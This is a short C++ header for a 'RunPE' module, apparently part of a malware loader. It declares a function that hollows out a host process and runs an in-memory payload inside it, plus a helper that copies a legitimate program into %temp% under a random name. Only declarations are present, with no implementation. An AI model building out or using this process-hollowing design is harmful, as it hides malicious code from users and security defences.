#pragma once
#include <vector>
#include <string>

namespace RunPE {
    // Hollows out hostProcessPath and executes memoryBuffer inside
    bool Execute(const std::vector<uint8_t>& memoryBuffer, size_t allocationSize);

    // Private helper: Randomly duplicates a legitimate host into %temp%
    std::string GenerateRandomizedHost();
}
